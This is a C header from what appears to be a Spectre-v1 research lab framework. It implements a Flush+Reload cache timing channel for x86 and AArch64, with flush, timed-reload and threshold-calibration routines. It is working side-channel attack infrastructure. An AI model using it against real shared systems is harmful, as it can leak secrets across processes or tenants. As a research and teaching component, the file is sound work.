/* SPDX-License-Identifier: GPL-2.0-only
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 *
 * Shared Flush+Reload timing channel.
 *
 * The timing channel behind one interface: flush a class slot, run the
 * transient, then time a reload -- a reload below the hot threshold means the
 * transient touched that class. The slot stride and class count come from
 * encode.h. Header-only (static inline), so a lab includes it with no extra
 * object to link.
 *
 * The hot/cold threshold is NOT baked in here: a caller passes it, so it can be
 * calibrated from the live host rather than hardcoded. The probe side is
 * per-ISA: x86 uses clflush + rdtsc; AArch64 uses DC CIVAC + the PMU cycle
 * counter PMCCNTR_EL0 (CNTVCT_EL0 is too coarse to separate the cache levels on
 * the tested Cortex-A76, and a shared counting-thread clock inverts from
 * cross-core contention; PMCCNTR_EL0 needs a small kernel module to open EL0
 * access, labs/spectre-v1/kernel). Both sit behind this one interface, so a lab
 * includes the header and never names an instruction directly.
 */
#ifndef FRAMEWORK_ORACLE_H
#define FRAMEWORK_ORACLE_H

#include <stddef.h>
#include <stdint.h>

#include "encode.h"

#if defined(__x86_64__)

static inline void oracle_flush_line(void *p)
{
    __asm__ volatile(
        "clflush (%0)\n\t"
        "mfence\n\t"
        "lfence\n\t"
        :: "r"(p) : "memory");
}

static inline uint64_t oracle_reload_time(void *p)
{
    unsigned lo, hi;
    uint64_t a, b;

    __asm__ volatile("mfence\n\tlfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    a = ((uint64_t)hi << 32) | lo;
    __asm__ volatile("mov (%0), %%eax" :: "r"(p) : "eax", "memory");
    __asm__ volatile("lfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    b = ((uint64_t)hi << 32) | lo;
    return b - a;
}

/* x86 times with rdtsc directly, so the timer needs no setup; the lab calls
 * oracle_timer_start() unconditionally. */
static inline void oracle_timer_start(int cpu) { (void)cpu; }

#elif defined(__aarch64__)

/* AArch64 clock: the PMU cycle counter PMCCNTR_EL0 (~0.4 ns at 2.4 GHz). It is
 * the only userspace-reachable clock that separates the cache levels on the
 * tested Cortex-A76: the 54 MHz virtual counter CNTVCT_EL0 is too coarse (a
 * flushed line sits in the last-level cache, ~15 ns, under one 18.5 ns tick),
 * and a shared counting-thread counter inverts from cross-core line contention.
 * PMCCNTR_EL0 traps from EL0 unless PMUSERENR_EL0 permits the read, so the lab
 * loads labs/spectre-v1/kernel/pmu_user_el0.ko first; without it the first
 * `mrs pmccntr_el0` raises SIGILL. oracle_timer_start() is the hook for a
 * backend that needs per-process setup; this one needs none beyond the module. */
static inline void oracle_timer_start(int cpu) { (void)cpu; }

static inline void oracle_flush_line(void *p)
{
    __asm__ volatile(
        "dc civac, %0\n\t"
        "dsb ish\n\t"
        "isb\n\t"
        :: "r"(p) : "memory");
}

static inline uint64_t oracle_reload_time(void *p)
{
    uint64_t a, b;
    uint32_t value;

    /* One asm block so nothing reorders: a system-register read (mrs) is not
     * ordered by `dsb ld`, so split across statements the second sample floats
     * up next to the first and the delta collapses to a constant. Each counter
     * read is fenced with isb; `dsb ld` between them retires the probe load so a
     * miss still in flight is not clipped. The ~isb+mrs floor is constant and
     * cancels in the hit-vs-miss comparison. PMCCNTR_EL0 is EL0-readable only
     * once the lab's kernel module has set PMUSERENR_EL0 (see above). */
    __asm__ volatile(
        "isb\n\t"
        "mrs %0, pmccntr_el0\n\t"
        "ldr %w2, [%3]\n\t"
        "dsb ld\n\t"
        "isb\n\t"
        "mrs %1, pmccntr_el0\n\t"
        : "=&r"(a), "=&r"(b), "=&r"(value)
        : "r"(p)
        : "memory");
    (void)value;
    return b - a;
}

#else
#error "oracle.h: no Flush+Reload backend for this architecture"
#endif

/* Address of class slot `cls` in an oracle buffer based at `base`. */
static inline void *oracle_slot(void *base, int cls)
{
    return (uint8_t *)base + (size_t)cls * ENC_SLOT_SIZE;
}

/* Bytes an oracle buffer needs: one slot per class. */
static inline size_t oracle_span(void)
{
    return (size_t)ENC_SLOT_SIZE * ENC_NCLASS;
}

/* A hot/cold threshold calibrated from a measured hot and cold reload, instead
 * of a hardcoded constant: the midpoint of the gap. Returns 0
 * when the two are not clearly separated (cold under 2x hot, or within 40
 * cycles), which the caller treats as a failed self-test rather than trusting a
 * threshold it cannot place. Both backends count CPU cycles (x86 rdtsc, AArch64
 * PMCCNTR_EL0), so one cycle-scaled gap fits both. Keeping the policy here lets
 * every lab calibrate the same way. */
static inline uint64_t oracle_threshold(uint64_t hot, uint64_t cold)
{
    if (cold <= hot || cold < hot * 2 || cold < hot + 40)
        return 0;
    return hot + (cold - hot) / 2;
}

#endif /* FRAMEWORK_ORACLE_H */
